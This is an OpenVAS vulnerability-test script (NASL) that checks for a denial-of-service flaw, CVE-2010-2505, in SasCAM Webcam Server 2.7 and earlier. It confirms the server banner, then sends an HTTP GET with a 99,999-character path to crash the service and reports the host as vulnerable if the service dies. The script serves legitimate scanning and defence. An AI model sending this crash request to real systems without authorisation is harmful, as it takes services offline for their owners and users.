###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_sascam_webcam_server_dos_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# SasCAM Request Processing Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to crash the server process,
  resulting in a denial-of-service condition.
  Impact Level: Application";
tag_affected = "Soft SaschArt SasCAM Webcam Server 2.7 and prior";
tag_insight = "The flaw is due to an error when handling certain requests, which
  can be exploited to block processing of further requests and terminate the
  application by sending specially crafted requests.";
tag_solution = "No solution or patch is available as of 30th June, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://soft.saschart.com/sascam_webcam_server.php";
tag_summary = "This host is running SasCam Webcam Server and is prone to denial
  of service vulnerability.";

if(description)
{
  script_id(901132);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-07-02 08:02:13 +0200 (Fri, 02 Jul 2010)");
  script_cve_id("CVE-2010-2505");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("SasCAM Request Processing Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/40214");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/13888");

  script_description(desc);
  script_summary("Determine if SasCAM Webcam Server is prone to a denial-of-service vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Get HTTP Port
port = get_http_port(default:8080);
if(!port) {
  exit(0);
}

banner = get_http_banner(port:port);

## Confirm Application
if("Server: SaServer" >< banner)
{
  ## Open Socket
  sock = http_open_socket(port);
  if(!sock) {
    exit(0);
  }

  ## Sending Crash
  crash = http_get( item:"/"+ crap(99999),  port:port);
  send(socket:sock, data:crash);
  http_close_socket(sock);

  ## Check Port Status
  if (http_is_dead(port: port))
  {
    security_warning(port);
    exit(0);
  }
}

